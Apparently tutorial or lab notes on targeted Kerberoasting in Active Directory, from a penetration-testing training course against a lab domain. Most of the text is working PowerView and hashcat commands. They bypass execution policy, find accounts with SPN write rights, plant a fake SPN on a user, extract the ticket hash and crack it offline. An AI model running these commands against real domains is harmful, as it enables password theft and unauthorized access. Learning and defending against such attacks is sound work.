[Kerberoasting](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/detecting-ldap-based-kerberoasting-with-azure-atp/ba-p/462448) is a post-exploitation attack that takes advantage of the way `Service Principal Names` (`SPNs`) are used in Active Directory for authentication. When a client requests a Kerberos TGS service ticket, it gets encrypted with the service account’s NTLM password hash. An attacker can obtain this ticket and perform offline password cracking to open it. If successful, the attacker can obtain the service account’s password. The success of this attack depends on the strength of the service account’s password. (Review the [Kerberos Attacks](https://academy.hackthebox.com/module/details/25) module to learn about `Kerberoasting` and other `Kerberos` attacks.)

When an attacker possesses an account with the ability to edit the `servicePrincipalName` attribute of another user account in a domain, they can potentially make that account vulnerable to a `Kerberoasting` attack. By adding an `SPN` to the user account, the attacker can request a Kerberos TGS service ticket for that `SPN` and obtain it, encrypted with the user account's NTLM password hash. The attacker can then use offline password-cracking techniques to try to open the ticket and obtain the user account's password.

This is possible when the controlled account has `GenericAll`, `GenericWrite`, `WriteProperty`, `WriteSPN` or `Validated-SPN` over the target.

## Identifying Vulnerable Accounts

![targeted_kerberoast_bloodhound.png](https://academy.hackthebox.com/storage/modules/219/targeted_kerberoast_bloodhound.png)

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid
PS C:\Tools> Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}

ObjectDN               : CN=Rita,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-1267651629-1192007096-1618970724-4613
ActiveDirectoryRights  : WriteProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : f3a64788-5306-11d1-a9c5-0000f80367c1
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 32
SecurityIdentifier     : S-1-5-21-1267651629-1192007096-1618970724-4617
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

## Targeted Kerberoasting from Windows

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser Rita | Select serviceprincipalname

serviceprincipalname
--------------------
```

> Settting the SPN

```powershell
PS C:\Tools> Set-DomainObject -Identity rita -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```

> Getting Rita Hash

```powershell
PS C:\Tools> $User = Get-DomainUser Rita
PS C:\Tools> $User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
```

> Clearing the SPNs of Rita

```powershell
PS C:\Tools> Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose
```

---
---
## Cracking The Kerberoastable Hash

```bash
hashcat -m 13100 /tmp/rita.hash /usr/share/wordlists/rockyou.txt --force
```

---
---
